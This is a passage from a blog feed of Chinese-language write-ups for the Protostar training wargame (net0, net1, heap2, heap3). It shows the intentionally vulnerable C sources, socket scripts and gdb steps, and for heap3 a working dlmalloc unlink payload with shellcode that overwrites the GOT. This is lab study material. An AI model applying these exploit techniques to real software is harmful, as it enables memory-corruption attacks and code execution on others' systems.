*username;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Run the process as a daemon */</span></span><br><span class="line">  background_process(NAME, UID, GID); </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Wait for socket activity and return */</span></span><br><span class="line">  fd = serve_forever(PORT);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the client socket to STDIN, STDOUT, and STDERR */</span></span><br><span class="line">  set_io(fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Don't do this :&gt; */</span></span><br><span class="line">  srandom(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">run</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"127.0.0.1"</span>, <span class="number">2998</span>))</span><br><span class="line"></span><br><span class="line">n = s.recv(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] n:"</span> + n</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] repr(n):"</span> + repr(n)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Hex:"</span> + n.encode(<span class="string">'hex'</span>)</span><br><span class="line">N = struct.unpack(<span class="string">"I"</span>,n)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] N:"</span></span><br><span class="line"><span class="keyword">print</span> N</span><br><span class="line">s.send(str(N))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Recv:"</span> + s.recv(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/net1_1.jpg" data-fancybox="group" data-caption="net1_1" class="fancybox"><img alt="net1_1" title="net1_1" data-src="https://dblu3.github.io/img/Protostar/net1_1.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Net1&quot;&gt;&lt;a href=&quot;#Net1&quot; class=&quot;headerlink&quot; title=&quot;Net1&quot;&gt;&lt;/a&gt;Net1&lt;/h1&gt;&lt;p&gt;Net1: convert binary integers into ascii&lt;br&gt;跟net0没太大差别，直接写个脚本就行了&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_net0</title>
    <link href="http://yoursite.com/2018/09/18/Protostar-net0/"/>
    <id>http://yoursite.com/2018/09/18/Protostar-net0/</id>
    <published>2018-09-18T06:44:37.000Z</published>
    <updated>2018-09-18T07:57:27.756Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Net0"><a href="#Net0" class="headerlink" title="Net0"></a>Net0</h1><p>Net0: convert strings to little endian integers</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Net0</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/common.c"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAME <span class="meta-string">"net0"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 999</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GID 999</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 2999</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> wanted;</span><br><span class="line"></span><br><span class="line">  wanted = <span class="built_in">random</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please send '%d' as a little endian 32bit int\n"</span>, wanted);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(fread(&amp;i, <span class="keyword">sizeof</span>(i), <span class="number">1</span>, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      errx(<span class="number">1</span>, <span class="string">":(\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(i == wanted) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Thank you sir/madam\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"I'm sorry, you sent %d instead\n"</span>, i);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">char</span> *username;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Run the process as a daemon */</span></span><br><span class="line">  background_process(NAME, UID, GID); </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Wait for socket activity and return */</span></span><br><span class="line">  fd = serve_forever(PORT);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the client socket to STDIN, STDOUT, and STDERR */</span></span><br><span class="line">  set_io(fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Don't do this :&gt; */</span></span><br><span class="line">  srandom(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">run</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="查看net0运行状态"><a href="#查看net0运行状态" class="headerlink" title="查看net0运行状态"></a>查看net0运行状态</h2><p>切换到root:godmode查看net0的端口<br><a href="https://dblu3.github.io/img/Protostar/net0_1.jpg" data-fancybox="group" data-caption="net0_1" class="fancybox"><img alt="net0_1" title="net0_1" data-src="https://dblu3.github.io/img/Protostar/net0_1.jpg" class="lazyload"></a></p><h2 id="监听net0"><a href="#监听net0" class="headerlink" title="监听net0"></a>监听net0</h2><p>提示我们应该输入little endian 32bit int的数据<br><a href="https://dblu3.github.io/img/Protostar/net0_2.jpg" data-fancybox="group" data-caption="net0_2" class="fancybox"><img alt="net0_2" title="net0_2" data-src="https://dblu3.github.io/img/Protostar/net0_2.jpg" class="lazyload"></a></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>使用<code>cat -</code>将输入的内容重定向到输出<br><a href="https://dblu3.github.io/img/Protostar/net0_3.jpg" data-fancybox="group" data-caption="net0_3" class="fancybox"><img alt="net0_3" title="net0_3" data-src="https://dblu3.github.io/img/Protostar/net0_3.jpg" class="lazyload"></a></p><p>用python的struct模块转换一下<br><a href="https://dblu3.github.io/img/Protostar/net0_4.jpg" data-fancybox="group" data-caption="net0_4" class="fancybox"><img alt="net0_4" title="net0_4" data-src="https://dblu3.github.io/img/Protostar/net0_4.jpg" class="lazyload"></a></p><p>输入后记得使用<code>CTRL+D</code>完成输入</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin# echo -e &quot;&#96;cat - &#96;&quot; | nc 127.0.0.1 2999</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/net0_5.jpg" data-fancybox="group" data-caption="net0_5" class="fancybox"><img alt="net0_5" title="net0_5" data-src="https://dblu3.github.io/img/Protostar/net0_5.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Net0&quot;&gt;&lt;a href=&quot;#Net0&quot; class=&quot;headerlink&quot; title=&quot;Net0&quot;&gt;&lt;/a&gt;Net0&lt;/h1&gt;&lt;p&gt;Net0: convert strings to little endian integers&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_heap3</title>
    <link href="http://yoursite.com/2018/09/16/Protostar-heap3/"/>
    <id>http://yoursite.com/2018/09/16/Protostar-heap3/</id>
    <published>2018-09-16T13:51:17.000Z</published>
    <updated>2018-09-17T17:25:12.308Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Heap3"><a href="#Heap3" class="headerlink" title="Heap3"></a>Heap3</h1><p>Heap3：dlmalloc(Doug Lea Malloc)的unlink漏洞</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Heap3</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"that wasn't too bad now, was it? @ %d\n"</span>, time(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *a, *b, *c;</span><br><span class="line"></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">  b = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">  c = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(a, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(b, argv[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(c, argv[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"dynamite failed?\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="dlmalloc"><a href="#dlmalloc" class="headerlink" title="dlmalloc"></a>dlmalloc</h2><p>dlmalloc是通过块管理的，结构体头部如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> prev_size;<span class="comment">// 上一个块的大小</span></span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>;<span class="comment">// 最重要的是最后1位，它表示上一个块是否空闲(空闲时为0)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">fd</span>;</span><span class="comment">// 前一个块的指针，当前块空闲时有效</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">bk</span>;</span><span class="comment">// 后一个块的指针，当前块空闲时有效</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><p>通过上一个buffer把prev_size和size都设为-4(\xfc\xff\xff\xff)之后，触发unlink</p><p>这里稍微解释一下为什么(\xfc\xff\xff\xff)是-4，其实通过计算就很容易发现了</p><p>0xffff fffc + 0x6 = 0x1 0000 0002 多出来的1溢出了，所以相当于0x6-0x4=0x2</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">unlink(p, bck, fwd)</span><br><span class="line">&#123;</span><br><span class="line">    bck = p-&gt;bk;  <span class="comment">// winner()</span></span><br><span class="line">    fwd = p-&gt;fd;  <span class="comment">// puts@got - 12</span></span><br><span class="line"></span><br><span class="line">    fwd-&gt;bk = bck;  </span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">fwd + 12 = puts@got =&gt; winner()</span></span><br><span class="line"><span class="comment">执行到此处程序会崩溃，所以可以把winner()改成shellcode</span></span><br><span class="line"><span class="comment">fwd + 12 = puts@got =&gt; shellcode地址 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">    bck-&gt;fd = fwd;  </span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">bck + 8 = winner() + 8 = puts@got - 12 </span></span><br><span class="line"><span class="comment">相应的：shellcode地址 + 8 = puts@got - 12 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>分别在malloc()、srtcpy()、free()、printf()处下断点<br><a href="https://dblu3.github.io/img/Protostar/heap3_1.jpg" data-fancybox="group" data-caption="heap3_1" class="fancybox"><img alt="heap3_1" title="heap3_1" data-src="https://dblu3.github.io/img/Protostar/heap3_1.jpg" class="lazyload"></a></p><p>运行并找到heap地址<br><a href="https://dblu3.github.io/img/Protostar/heap3_2.jpg" data-fancybox="group" data-caption="heap3_2" class="fancybox"><img alt="heap3_2" title="heap3_2" data-src="https://dblu3.github.io/img/Protostar/heap3_2.jpg" class="lazyload"></a></p><p>找到a的buffer地址:0x804c008<br><a href="https://dblu3.github.io/img/Protostar/heap3_3.jpg" data-fancybox="group" data-caption="heap3_3" class="fancybox"><img alt="heap3_3" title="heap3_3" data-src="https://dblu3.github.io/img/Protostar/heap3_3.jpg" class="lazyload"></a></p><h2 id="winner-地址"><a href="#winner-地址" class="headerlink" title="winner()地址"></a>winner()地址</h2><p><a href="https://dblu3.github.io/img/Protostar/heap3_4.jpg" data-fancybox="group" data-caption="heap3_4" class="fancybox"><img alt="heap3_4" title="heap3_4" data-src="https://dblu3.github.io/img/Protostar/heap3_4.jpg" class="lazyload"></a></p><h2 id="执行winner-的shellcode"><a href="#执行winner-的shellcode" class="headerlink" title="执行winner()的shellcode"></a>执行winner()的shellcode</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push 0x08048864</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></div><p>对应的shellcode是<code>\x68\x64\x88\x04\x08\xc3</code></p><h2 id="puts-got的地址"><a href="#puts-got的地址" class="headerlink" title="puts@got的地址"></a>puts@got的地址</h2><p><a href="https://dblu3.github.io/img/Protostar/heap3_5.jpg" data-fancybox="group" data-caption="heap3_5" class="fancybox"><img alt="heap3_5" title="heap3_5" data-src="https://dblu3.github.io/img/Protostar/heap3_5.jpg" class="lazyload"></a></p><h2 id="shellcode地址"><a href="#shellcode地址" class="headerlink" title="shellcode地址"></a>shellcode地址</h2><p>0x804b128-0xc(12)=0x804b11c</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>payload: 12个字节的nop + 6个字节的shellcode + 14个字节的填充(a的buffer: 12+6+14=32个字节) + 2个“\xfc\xff\xff\xff” + 4个字节填充(p-(-4)=p+4) + shellcode地址(puts@got的地址-12) + a的buffer地址 + 任意字符(补充第3个参数)</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin$ .&#x2F;heap3 &#96;python -c &#39;print &quot;\x90&quot;*12 + &quot;\x68\x64\x88\x04\x08\xc3&quot; + &quot;A&quot;*14 + &quot;\xfc\xff\xff\xff&quot;*2&#39;&#96;  &#96;python -c print&#39; &quot;BBBB&quot; + &quot;\x1c\xb1\x04\x08&quot; + &quot;\x08\xc0\x04\x08&quot;&#39;&#96; CCCC</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/heap3_6.jpg" data-fancybox="group" data-caption="heap3_6" class="fancybox"><img alt="heap3_6" title="heap3_6" data-src="https://dblu3.github.io/img/Protostar/heap3_6.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Heap3&quot;&gt;&lt;a href=&quot;#Heap3&quot; class=&quot;headerlink&quot; title=&quot;Heap3&quot;&gt;&lt;/a&gt;Heap3&lt;/h1&gt;&lt;p&gt;Heap3：dlmalloc(Doug Lea Malloc)的unlink漏洞&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_heap2</title>
    <link href="http://yoursite.com/2018/09/15/Protostar-heap2/"/>
    <id>http://yoursite.com/2018/09/15/Protostar-heap2/</id>
    <published>2018-09-15T13:33:08.000Z</published>
    <updated>2018-09-16T13:50:32.029Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Heap2"><a href="#Heap2" class="headerlink" title="Heap2"></a>Heap2</h1><p>Heap2: Use-After-Free(UAF)</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Heap2</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">auth</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">32</span>];</span><br><span class="line">  <span class="keyword">int</span> auth;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">auth</span> *<span class="title">auth</span>;</span></span><br><span class="line"><span class="keyword">char</span> *service;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> <span class="built_in">line</span>[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[ auth = %p, service = %p ]\n"</span>, auth, service);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(fgets(<span class="built_in">line</span>, <span class="keyword">sizeof</span>(<span class="built_in">line</span>), <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) <span class="keyword">break</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strncmp</span>(<span class="built_in">line</span>, <span class="string">"auth "</span>, <span class="number">5</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">          auth = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(auth));</span><br><span class="line">          <span class="built_in">memset</span>(auth, <span class="number">0</span>, <span class="keyword">sizeof</span>(auth));</span><br><span class="line">          <span class="keyword">if</span>(<span class="built_in">strlen</span>(<span class="built_in">line</span> + <span class="number">5</span>) &lt; <span class="number">31</span>) &#123;</span><br><span class="line">              <span class="built_in">strcpy</span>(auth-&gt;name, <span class="built_in">line</span> + <span class="number">5</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strncmp</span>(<span class="built_in">line</span>, <span class="string">"reset"</span>, <span class="number">5</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="built_in">free</span>(auth);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strncmp</span>(<span class="built_in">line</span>, <span class="string">"service"</span>, <span class="number">6</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">          service = strdup(<span class="built_in">line</span> + <span class="number">7</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strncmp</span>(<span class="built_in">line</span>, <span class="string">"login"</span>, <span class="number">5</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span>(auth-&gt;auth) &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"you have logged in already!\n"</span>);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"please enter your password\n"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>查看heap的内存地址</p><p><a href="https://dblu3.github.io/img/Protostar/heap2_1.jpg" data-fancybox="group" data-caption="heap2_1" class="fancybox"><img alt="heap2_1" title="heap2_1" data-src="https://dblu3.github.io/img/Protostar/heap2_1.jpg" class="lazyload"></a></p><p>找到printf的地址</p><p><a href="https://dblu3.github.io/img/Protostar/heap2_2.jpg" data-fancybox="group" data-caption="heap2_2" class="fancybox"><img alt="heap2_2" title="heap2_2" data-src="https://dblu3.github.io/img/Protostar/heap2_2.jpg" class="lazyload"></a></p><p>在printf处下断点,设置command</p><p><a href="https://dblu3.github.io/img/Protostar/heap2_3.jpg" data-fancybox="group" data-caption="heap2_3" class="fancybox"><img alt="heap2_3" title="heap2_3" data-src="https://dblu3.github.io/img/Protostar/heap2_3.jpg" class="lazyload"></a></p><p>输入<code>auth admin</code> </p><p>name处确实有admin字样，但auth的值仍为0</p><p><a href="https://dblu3.github.io/img/Protostar/heap2_4.jpg" data-fancybox="group" data-caption="heap2_4" class="fancybox"><img alt="heap2_4" title="heap2_4" data-src="https://dblu3.github.io/img/Protostar/heap2_4.jpg" class="lazyload"></a></p><p>尝试输入数据到heap中，auth的值突变</p><p><a href="https://dblu3.github.io/img/Protostar/heap2_5.jpg" data-fancybox="group" data-caption="heap2_5" class="fancybox"><img alt="heap2_5" title="heap2_5" data-src="https://dblu3.github.io/img/Protostar/heap2_5.jpg" class="lazyload"></a></p><h2 id="关于auth变量的命名"><a href="#关于auth变量的命名" class="headerlink" title="关于auth变量的命名"></a>关于auth变量的命名</h2><p>当程序运行到<code>auth = malloc(sizeof(auth));</code>会计算变量的大小</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">auth</span> 